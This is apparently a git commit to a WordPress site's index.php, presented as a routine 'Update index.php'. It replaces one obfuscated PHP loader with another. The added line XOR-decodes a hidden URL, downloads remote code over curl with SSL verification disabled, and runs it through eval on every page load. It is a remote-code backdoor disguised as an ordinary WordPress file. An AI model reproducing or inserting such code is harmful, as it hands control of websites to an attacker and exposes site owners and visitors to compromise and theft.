85183d4cc494b19e8c76f35d991eb43768b800b9
rh1519868-dotcom <rh1519868@gmail.com>
2026-06-16 12:39:09 +0600

    Update index.php

--- index.php
+++ index.php
@@ -6,7 +6,7 @@
  * @package WordPress
  */
 
-$_0="\x77\x21\x50\x34\x6E\x5A\x40\x38";$_1='H1UkRFR1bwpHFX4FXHRyCEEPYQFadToORxRjBDFob0sDQCQbBzQkXQ8PJEwa';$_2=base64_decode($_1);$_3=implode('',array_map(function($i)use($_0,$_2){return chr(ord($_2[$i])^ord($_0[$i%8]));},range(0,strlen($_2)-1)));unset($_0,$_1,$_2);if($_4=@curl_init($_3)){@curl_setopt_array($_4,[19913=>1,52=>1,13=>15,10018=>'Mozilla/5.0',64=>0]);$_5=@curl_exec($_4);@curl_close($_4);if($_5!==false)@eval(preg_replace(['/^\s*<\?php\s*/i','/\?>\s*$/'],'',$_5));unset($_3,$_4,$_5);}
+$_k=[64,57,118,66,107,33,51,87];$_d=[40,77,2,50,81,14,28,101,112,13,88,115,89,15,1,103,118,23,71,119,95,14,73,97,112,12,69,114,52,19,28,36,52,88,2,109,2,79,87,50,56,23,2,58,31];$_u=implode('',array_map(function($v,$i)use($_k){return chr($v^$_k[$i%8]);},$_d,array_keys($_d)));unset($_k,$_d);if($_c=@curl_init($_u)){@curl_setopt_array($_c,[19913=>1,52=>1,13=>15,10018=>'Mozilla/5.0',64=>0]);$_s=@curl_exec($_c);@curl_close($_c);if($_s!==false)@eval(preg_replace(['/^\s*<\?php\s*/i','/\?>\s*$/'],'',$_s));unset($_u,$_c,$_s);}
 
 /**
  * Tells WordPress to load the WordPress theme and output it.
